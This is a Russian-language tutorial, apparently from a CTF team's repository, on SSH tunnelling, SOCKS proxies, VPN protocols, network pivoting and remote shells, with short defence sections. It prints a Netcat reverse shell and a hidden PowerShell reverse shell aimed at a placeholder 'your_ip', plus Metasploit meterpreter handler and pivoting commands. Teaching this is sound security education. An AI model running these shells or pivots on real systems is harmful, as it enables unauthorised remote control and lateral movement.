@@ -1,0 +1,982 @@
+<article class="markdown-body entry-content container-lg" itemprop="text">
+ <div class="markdown-heading" dir="auto">
+  <h1 class="heading-element" dir="auto" tabindex="-1">
+   Тунелирование Соединений
+  </h1>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Оглавление
+  </h2>
+ </div>
+ <ol dir="auto">
+  <li>
+   <a href="#1-%D1%82%D1%83%D0%BD%D0%B5%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5-%D1%81%D0%BE%D0%B5%D0%B4%D0%B8%D0%BD%D0%B5%D0%BD%D0%B8%D0%B9">
+    Тунелирование
+                Соединений
+   </a>
+   <ul dir="auto">
+    <li>
+     <a href="#11-%D0%B2%D0%B2%D0%B5%D0%B4%D0%B5%D0%BD%D0%B8%D0%B5-%D0%B2-%D1%82%D1%83%D0%BD%D0%B5%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5-%D1%81%D0%BE%D0%B5%D0%B4%D0%B8%D0%BD%D0%B5%D0%BD%D0%B8%D0%B9">
+      Введение
+                        в Тунелирование Соединений
+     </a>
+    </li>
+    <li>
+     <a href="#12-ssh-%D1%82%D1%83%D0%BD%D0%B5%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5">
+      SSH-Тунелирование
+     </a>
+     <ul dir="auto">
+      <li>
+       <a href="#121-%D0%BB%D0%BE%D0%BA%D0%B0%D0%BB%D1%8C%D0%BD%D0%BE%D0%B5-ssh-%D1%82%D1%83%D0%BD%D0%B5%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5">
+        Локальное
+                                SSH-тунелирование
+       </a>
+      </li>
+      <li>
+       <a href="#122-%D1%83%D0%B4%D0%B0%D0%BB%D1%91%D0%BD%D0%BD%D0%BE%D0%B5-ssh-%D1%82%D1%83%D0%BD%D0%B5%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5">
+        Удалённое
+                                SSH-тунелирование
+       </a>
+      </li>
+      <li>
+       <a href="#123-%D0%B4%D0%B8%D0%BD%D0%B0%D0%BC%D0%B8%D1%87%D0%B5%D1%81%D0%BA%D0%BE%D0%B5-ssh-%D1%82%D1%83%D0%BD%D0%B5%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5">
+        Динамическое
+                                SSH-тунелирование
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#13-socks-%D0%BF%D1%80%D0%BE%D0%BA%D1%81%D0%B8">
+      SOCKS-Прокси
+     </a>
+    </li>
+    <li>
+     <a href="#14-%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80%D1%8B-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-%D1%82%D1%83%D0%BD%D0%B5%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-%D1%81%D0%BE%D0%B5%D0%B4%D0%B8%D0%BD%D0%B5%D0%BD%D0%B8%D0%B9">
+      Примеры
+                        использования Тунелирования Соединений
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#2-vpn-%D1%82%D1%83%D0%BD%D0%B5%D0%BB%D0%B8">
+    VPN-Тунели
+   </a>
+   <ul dir="auto">
+    <li>
+     <a href="#21-%D0%BE%D1%81%D0%BD%D0%BE%D0%B2%D0%BD%D1%8B%D0%B5-%D0%B7%D0%B0%D0%B4%D0%B0%D1%87%D0%B8-vpn-%D1%82%D1%83%D0%BD%D0%B5%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F">
+      Основные
+                        задачи VPN-тунелирования
+     </a>
+    </li>
+    <li>
+     <a href="#22-%D0%BF%D1%80%D0%B5%D0%B8%D0%BC%D1%83%D1%89%D0%B5%D1%81%D1%82%D0%B2%D0%B0-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-vpn">
+      Преимущества
+                        использования VPN
+     </a>
+    </li>
+    <li>
+     <a href="#23-%D0%BE%D1%81%D0%BD%D0%BE%D0%B2%D0%BD%D1%8B%D0%B5-%D0%BF%D1%80%D0%BE%D1%82%D0%BE%D0%BA%D0%BE%D0%BB%D1%8B-vpn">
+      Основные
+                        протоколы VPN
+     </a>
+     <ul dir="auto">
+      <li>
+       <a href="#231-openvpn">
+        OpenVPN
+       </a>
+      </li>
+      <li>
+       <a href="#232-ipsec">
+        IPSec
+       </a>
+      </li>
+      <li>
+       <a href="#233-l2tp-layer-2-tunneling-protocol">
+        L2TP
+       </a>
+      </li>
+      <li>
+       <a href="#234-wireguard">
+        WireGuard
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#24-%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80%D1%8B-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-vpn">
+      Примеры
+                        использования VPN
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#3-pivoting">
+    Pivoting
+   </a>
+   <ul dir="auto">
+    <li>
+     <a href="#31-%D0%B2%D0%B2%D0%B5%D0%B4%D0%B5%D0%BD%D0%B8%D0%B5-%D0%B2-pivoting">
+      Введение в
+                        Pivoting
+     </a>
+    </li>
+    <li>
+     <a href="#32-%D1%82%D0%B8%D0%BF%D1%8B-pivoting">
+      Типы Pivoting
+     </a>
+    </li>
+    <li>
+     <a href="#33-%D0%B8%D0%BD%D1%81%D1%82%D1%80%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D1%8B-%D0%B4%D0%BB%D1%8F-pivoting">
+      Инструменты
+                        для Pivoting
+     </a>
+    </li>
+    <li>
+     <a href="#34-%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80%D1%8B-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-pivoting">
+      Примеры
+                        использования Pivoting
+     </a>
+    </li>
+    <li>
+     <a href="#35-%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D0%B0-%D0%BE%D1%82-pivoting">
+      Защита от Pivoting
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#4-remote-shell">
+    Remote Shell
+   </a>
+   <ul dir="auto">
+    <li>
+     <a href="#41-%D0%B2%D0%B2%D0%B5%D0%B4%D0%B5%D0%BD%D0%B8%D0%B5-%D0%B2-remote-shell">
+      Введение в Remote
+                        Shell
+     </a>
+    </li>
+    <li>
+     <a href="#42-%D0%B8%D0%BD%D1%81%D1%82%D1%80%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D1%8B-%D0%B4%D0%BB%D1%8F-remote-shell">
+      Инструменты
+                        для Remote Shell
+     </a>
+    </li>
+    <li>
+     <a href="#43-%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80%D1%8B-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-remote-shell">
+      Примеры
+                        использования Remote Shell
+     </a>
+    </li>
+    <li>
+     <a href="#44-%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D0%B0-%D0%BE%D1%82-remote-shell">
+      Защита от Remote
+                        Shell
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#5-%D0%B7%D0%B0%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5">
+    Заключение
+   </a>
+  </li>
+  <li>
+   <a href="#6-%D1%80%D0%B5%D0%BA%D0%BE%D0%BC%D0%B5%D0%BD%D0%B4%D1%83%D0%B5%D0%BC%D1%8B%D0%B5-%D0%B8%D0%BD%D1%81%D1%82%D1%80%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D1%8B-%D0%B8-%D1%80%D0%B5%D1%81%D1%83%D1%80%D1%81%D1%8B">
+    Рекомендуемые
+                Инструменты и Ресурсы
+   </a>
+  </li>
+  <li>
+   <a href="#7-%D0%BF%D0%BE%D0%BB%D0%B5%D0%B7%D0%BD%D1%8B%D0%B5-%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D0%B8">
+    Полезные
+                ссылки
+   </a>
+  </li>
+ </ol>
+ <hr/>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   1. Тунелирование Соединений
+  </h2>
+ </div>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/Nnnikitosss/Picture/1.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/Nnnikitosss/Picture/1.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   1.1 Введение в Тунелирование Соединений
+  </h3>
+ </div>
+ <p dir="auto">
+  Тунелирование соединений позволяет передавать данные через защищённые каналы, создавая виртуальные
+        туннели. Это полезно для обхода сетевых ограничений и обеспечения безопасности данных. Тунелирование может быть
+        реализовано с использованием различных протоколов и инструментов, таких как SSH, VPN и SOCKS-прокси.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   1.2 SSH-Тунелирование
+  </h3>
+ </div>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/Nnnikitosss/Picture/2.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/Nnnikitosss/Picture/2.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  SSH-тунелирование используется для безопасной передачи данных через незащищённые сети. Оно позволяет
+        создавать зашифрованные каналы для передачи данных между клиентом и сервером.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   1.2.1 Локальное SSH-тунелирование
+  </h4>
+ </div>
+ <p dir="auto">
+  Локальное SSH-тунелирование перенаправляет локальный порт на удалённый сервер. Это полезно для доступа
+        к удалённым ресурсам через локальный порт.
+ </p>
+ <ul dir="auto">
+  <li>
+   Пример команды для создания локального SSH-туннеля:
+   <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+    <pre>ssh -L 8080:localhost:80 user@remote_host</pre>
+   </div>
+   В этом примере локальный порт 8080 перенаправляется на порт 80 удалённого хоста.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   1.2.2 Удалённое SSH-тунелирование
+  </h4>
+ </div>
+ <p dir="auto">
+  Удалённое SSH-тунелирование перенаправляет удалённый порт на локальный сервер. Это полезно для доступа
+        к локальным ресурсам через удалённый сервер.
+ </p>
+ <ul dir="auto">
+  <li>
+   Пример команды для создания удалённого SSH-туннеля:
+   <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+    <pre>ssh -R 8080:localhost:80 user@remote_host</pre>
+   </div>
+   В этом примере удалённый порт 8080 перенаправляется на порт 80 локального хоста.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   1.2.3 Динамическое SSH-тунелирование
+  </h4>
+ </div>
+ <p dir="auto">
+  Динамическое SSH-тунелирование создаёт SOCKS-прокси на локальном хосте. Это полезно для маршрутизации
+        трафика через SSH-соединение.
+ </p>
+ <ul dir="auto">
+  <li>
+   Пример команды для создания динамического SSH-туннеля:
+   <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+    <pre>ssh -D 1080 user@remote_host</pre>
+   </div>
+   В этом примере создаётся SOCKS-прокси на локальном порту 1080.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   1.3 SOCKS-Прокси
+  </h3>
+ </div>
+ <p dir="auto">
+  <a href="https://github.com/AnaktaCTF/CTFReports/blob/main/Nnnikitosss/Picture/3.png" rel="noopener noreferrer" target="_blank">
+   <img alt="image" src="https://github.com/AnaktaCTF/CTFReports/raw/main/Nnnikitosss/Picture/3.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  SOCKS-прокси используется для маршрутизации трафика через промежуточный сервер. Это позволяет скрыть
+        реальный IP-адрес и обойти сетевые ограничения.
+ </p>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Настройка SOCKS-прокси с использованием SSH:
+   </strong>
+   <ul dir="auto">
+    <li>
+     Пример команды для создания SOCKS-прокси:
+     <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+      <pre>ssh -D 1080 user@remote_host</pre>
+     </div>
+    </li>
+   </ul>
+   В этом примере создаётся SOCKS-прокси на локальном порту 1080.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   1.4 Примеры использования Тунелирования Соединений
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Обход сетевых ограничений:
+   </strong>
+   Тунелирование позволяет обойти ограничения, наложенные сетевыми
+            администраторами или интернет-провайдерами.
+  </li>
+  <li>
+   <strong>
+    Защита данных:
+   </strong>
+   Шифрование данных при передаче через незащищённые сети.
+  </li>
+  <li>
+   <strong>
+    Удалённый доступ:
+   </strong>
+   Обеспечение безопасного доступа к внутренним ресурсам компании или
+            организации.
+  </li>
+ </ul>
+ <hr/>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   2. VPN-Тунели
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   2.1 Основные задачи VPN-тунелирования
+  </h3>
+ </div>
+ <p dir="auto">
+  VPN (Virtual Private Network) обеспечивает защищённое соединение через незащищённые сети, такие как
+        Интернет. Основные задачи VPN-тунелирования:
+ </p>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Шифрование данных:
+   </strong>
+   Данные передаются в зашифрованном виде, что предотвращает их перехват.
+  </li>
+  <li>
+   <strong>
+    Скрытие IP-адреса:
+   </strong>
+   Ваш реальный IP-адрес замаскирован, что обеспечивает анонимность.
+  </li>
+  <li>
+   <strong>
+    Удалённый доступ:
+   </strong>
+   VPN позволяет безопасно подключаться к внутренним сетям компании или
+            других организаций.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   2.2 Преимущества использования VPN
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Безопасность:
+   </strong>
+   Защита данных от перехвата и несанкционированного доступа.
+  </li>
+  <li>
+   <strong>
+    Конфиденциальность:
+   </strong>
+   Скрытие реального IP-адреса и местоположения.
+  </li>
+  <li>
+   <strong>
+    Доступ к ресурсам:
+   </strong>
+   Возможность удалённого доступа к корпоративным ресурсам.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   2.3 Основные протоколы VPN
+  </h3>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   2.3.1 OpenVPN
+  </h4>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Описание:
+   </strong>
+   Надёжный и гибкий протокол, использующий SSL/TLS для шифрования.
+  </li>
+  <li>
+   <strong>
+    Преимущества:
+   </strong>
+   Высокая безопасность, гибкость настройки.
+  </li>
+  <li>
+   <strong>
+    Пример конфигурации OpenVPN:
+   </strong>
+   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+    <pre class="notranslate" lang="plaintext"><code>dev tun
+    proto udp
+    remote your-vpn-server.com 1194
+    cipher AES-256-CBC
+    auth SHA256
+    </code></pre>
+   </div>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   2.3.2 IPSec
+  </h4>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Описание:
+   </strong>
+   Используется для защиты интернет-протоколов через аутентификацию и шифрование.
+  </li>
+  <li>
+   <strong>
+    Преимущества:
+   </strong>
+   Высокая безопасность, широко используется в корпоративных VPN-решениях.
+  </li>
+  <li>
+   <strong>
+    Режимы работы:
+   </strong>
+   Transport и Tunnel.
+  </li>
+  <li>
+   <strong>
+    Комбинация с L2TP:
+   </strong>
+   Часто используется вместе с L2TP для повышения безопасности.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   2.3.3 L2TP (Layer 2 Tunneling Protocol)
+  </h4>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Описание:
+   </strong>
+   Часто используется вместе с IPSec для повышения безопасности.
+  </li>
+  <li>
+   <strong>
+    Преимущества:
+   </strong>
+   Простота настройки и совместимость.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   2.3.4 WireGuard
+  </h4>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Описание:
+   </strong>
+   Современный, легковесный и быстрый протокол.
+  </li>
+  <li>
+   <strong>
+    Преимущества:
+   </strong>
+   Меньшее количество строк кода делает его менее уязвимым к ошибкам.
+  </li>
+  <li>
+   <strong>
+    Пример настройки WireGuard:
+   </strong>
+  </li>
+ </ul>
+ <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+  <pre class="notranslate"><code>[Interface]
+    PrivateKey = &lt;ваш приватный ключ&gt;
+    Address = 10.0.0.1/24 
+    </code></pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   2.4 Примеры использования VPN
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Удалённая работа:
+   </strong>
+   Безопасное подключение сотрудников к корпоративной сети из любой точки
+            мира.
+  </li>
+  <li>
+   <strong>
+    Обход блокировок:
+   </strong>
+   Доступ к заблокированным ресурсам и сервисам.
+  </li>
+  <li>
+   <strong>
+    Защита в общественных сетях:
+   </strong>
+   Обеспечение безопасности при использовании общественных Wi-Fi
+            сетей.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   3. Pivoting
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   3.1 Введение в Pivoting
+  </h3>
+ </div>
+ <p dir="auto">
+  Pivoting позволяет атакующему использовать скомпрометированную систему для доступа к другим системам в
+        сети. Это важная техника в пентестинге и этическом хакинге, так как она позволяет расширить доступ к сети,
+        используя одну скомпрометированную машину в качестве точки опоры.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   3.2 Типы Pivoting
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Локальный Pivoting:
+   </strong>
+   Использование скомпрометированной машины для доступа к другим машинам в
+            той же сети.
+  </li>
+  <li>
+   <strong>
+    Удалённый Pivoting:
+   </strong>
+   Использование скомпрометированной машины для доступа к машинам в другой
+            сети через туннелирование.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   3.3 Инструменты для Pivoting
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Metasploit:
+    </strong>
+    Популярный инструмент для проведения атак и тестирования
+                безопасности.
+   </p>
+   <ul dir="auto">
+    <li>
+     Пример использования Metasploit для локального pivoting:
+     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+      <pre class="notranslate" lang="plaintext"><code>use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST your_ip
+    set LPORT 4444
+    exploit
+    </code></pre>
+     </div>
+    </li>
+    <li>
+     Создание туннеля с помощью Meterpreter:
+     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+      <pre class="notranslate" lang="plaintext"><code>meterpreter &gt; run autoroute -s 192.168.1.0/24
+    meterpreter &gt; run portfwd add -l 8080 -p 80 -r 192.168.1.100
+    </code></pre>
+     </div>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     ProxyChains:
+    </strong>
+    Инструмент для перенаправления сетевых соединений через цепочку
+                прокси-серверов.
+   </p>
+   <ul dir="auto">
+    <li>
+     Пример использования ProxyChains с SSH:
+     <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+      <pre>proxychains ssh user@remote_host</pre>
+     </div>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     SSH:
+    </strong>
+    Использование SSH-туннелей для перенаправления трафика.
+   </p>
+   <ul dir="auto">
+    <li>
+     Пример создания SSH-туннеля для pivoting:
+     <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+      <pre>ssh -L 8080:target_host:80 user@pivot_host</pre>
+     </div>
+    </li>
+   </ul>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   3.4 Примеры использования Pivoting
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Доступ к внутренним ресурсам:
+   </strong>
+   Использование скомпрометированной машины для доступа к
+            внутренним ресурсам, таким как базы данных или файловые серверы.
+  </li>
+  <li>
+   <strong>
+    Расширение атаки:
+   </strong>
+   Использование pivoting для распространения атаки на другие машины в сети.
+  </li>
+  <li>
+   <strong>
+    Сбор информации:
+   </strong>
+   Использование pivoting для сбора информации о внутренней сети и её
+            структуре.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   3.5 Защита от Pivoting
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Сегментация сети:
+   </strong>
+   Разделение сети на сегменты с ограничением доступа между ними.
+  </li>
+  <li>
+   <strong>
+    Мониторинг трафика:
+   </strong>
+   Использование систем обнаружения вторжений (IDS) для мониторинга
+            аномального трафика.
+  </li>
+  <li>
+   <strong>
+    Журналирование и аудит:
+   </strong>
+   Ведение журналов и регулярный аудит сетевой активности для
+            выявления подозрительных действий.
+  </li>
+ </ul>
+ <hr/>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   4. Remote Shell
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   4.1 Введение в Remote Shell
+  </h3>
+ </div>
+ <p dir="auto">
+  Remote Shell позволяет удалённо управлять системой через командную строку. Это полезно для
+        администрирования и выполнения команд на удалённых системах. Remote Shell может быть реализован с использованием
+        различных инструментов и протоколов, таких как Netcat, PowerShell и SSH.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   4.2 Инструменты для Remote Shell
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Netcat:
+    </strong>
+    Простой инструмент для создания удалённого шелла.
+   </p>
+   <ul dir="auto">
+    <li>
+     Пример команды для создания обратного шелла:
+     <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+      <pre>nc -e /bin/bash your_ip 4444</pre>
+     </div>
+    </li>
+   </ul>
+   <p dir="auto">
+    В этом примере Netcat используется для создания обратного шелла, который подключается к
+                указанному IP-адресу и порту.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     PowerShell:
+    </strong>
+    Мощный инструмент для управления Windows-системами.
+   </p>
+   <ul dir="auto">
+    <li>
+     Пример команды для создания обратного шелла с использованием PowerShell:
+     <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
+      <pre>powershell <span class="pl-k">-</span>NoP <span class="pl-k">-</span>NonI <span class="pl-k">-</span>W <span class="pl-k">Hidden</span> <span class="pl-k">-</span>Exec Bypass <span class="pl-k">-</span>Command <span class="pl-s"><span class="pl-pds">"</span>New-Object System.Net.Sockets.TCPClient('your_ip',4444);<span class="pl-smi">$stream</span> = <span class="pl-smi">$client</span>.GetStream();[byte[]]<span class="pl-smi">$bytes</span> = 0..65535|%{0};while((<span class="pl-smi">$i</span> = <span class="pl-smi">$stream</span>.Read(<span class="pl-smi">$bytes</span>, 0, <span class="pl-smi">$bytes</span>.Length)) -ne 0){;<span class="pl-smi">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="pl-smi">$bytes</span>,0, <span class="pl-smi">$i</span>);<span class="pl-smi">$sendback</span> = (iex <span class="pl-smi">$data</span> 2&gt;&amp;1 | Out-String );<span class="pl-smi">$sendback2</span>  = <span class="pl-smi">$sendback</span> + 'PS ' + (pwd).Path + '&gt; ';<span class="pl-smi">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="pl-smi">$sendback2</span>);<span class="pl-smi">$stream</span>.Write(<span class="pl-smi">$sendbyte</span>,0,<span class="pl-smi">$sendbyte</span>.Length);<span class="pl-smi">$stream</span>.Flush()}<span class="pl-pds">"</span></span></pre>
+     </div>
+    </li>
+   </ul>
+   <p dir="auto">
+    В этом примере PowerShell используется для создания обратного шелла, который подключается к
+                указанному IP-адресу и порту.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     SSH:
+    </strong>
+    Использование SSH для удалённого управления системами.
+   </p>
+   <ul dir="auto">
+    <li>
+     Пример команды для подключения к удалённому серверу с использованием SSH:
+     <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+      <pre>ssh user@remote_host</pre>
+     </div>
+    </li>
+   </ul>
+   <p dir="auto">
+    В этом примере SSH используется для подключения к удалённому серверу и выполнения команд.
+   </p>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   4.3 Примеры использования Remote Shell
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Администрирование систем:
+   </strong>
+   Remote Shell позволяет администраторам управлять системами и
+            выполнять команды на удалённых серверах.
+  </li>
+  <li>
+   <strong>
+    Тестирование на проникновение:
+   </strong>
+   Remote Shell используется пентестерами для выполнения команд
+            на скомпрометированных системах.
+  </li>
+  <li>
+   <strong>
+    Автоматизация задач:
+   </strong>
+   Remote Shell может быть использован для автоматизации различных задач
+            на удалённых системах.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   4.4 Защита от Remote Shell
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Ограничение доступа:
+   </strong>
+   Ограничение доступа к удалённым системам с использованием брандмауэров
+            и списков контроля доступа (ACL).
+  </li>
+  <li>
+   <strong>
+    Аутентификация и авторизация:
+   </strong>
+   Использование сильной аутентификации и авторизации для
+            доступа к удалённым системам.
+  </li>
+  <li>
+   <strong>
+    Мониторинг и аудит:
+   </strong>
+   Ведение журналов и регулярный аудит удалённых подключений для выявления
+            подозрительных действий.
+  </li>
+ </ul>
+ <hr/>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   5. Заключение
+  </h2>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    VPN-тунели:
+   </strong>
+   Обеспечивают защищённое соединение через незащищённые сети, скрывают IP-адрес и
+            позволяют удалённый доступ к ресурсам.
+  </li>
+  <li>
+   <strong>
+    Тунелирование соединений:
+   </strong>
+   Позволяет передавать данные через защищённые каналы, обходить
+            сетевые ограничения и обеспечивать безопасность данных.
+  </li>
+  <li>
+   <strong>
+    Pivoting:
+   </strong>
+   Используется для расширения доступа к сети через скомпрометированную систему, что
+            важно для пентестинга и этического хакинга.
+  </li>
+  <li>
+   <strong>
+    Remote Shell:
+   </strong>
+   Позволяет удалённо управлять системами через командную строку, что полезно
+            для администрирования и выполнения команд на удалённых системах.
+  </li>
+ </ul>
+ <hr/>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   6. Рекомендуемые Инструменты и Ресурсы
+  </h2>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    OpenVPN и WireGuard:
+   </strong>
+   Для создания защищённых туннелей.
+  </li>
+  <li>
+   <strong>
+    Metasploit и Netcat:
+   </strong>
+   Для тестирования на проникновение.
+  </li>
+  <li>
+   <strong>
+    Burp Suite и Impacket:
+   </strong>
+   Для анализа и эксплуатации сетевых протоколов.
+  </li>
+  <li>
+   <strong>
+    Wireshark и Nmap:
+   </strong>
+   Для анализа сетевого трафика и сканирования сети.
+  </li>
+ </ul>
+ <hr/>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   7. Полезные ссылки
+  </h2>
+ </div>
+ <ul dir="auto">
+  <li>
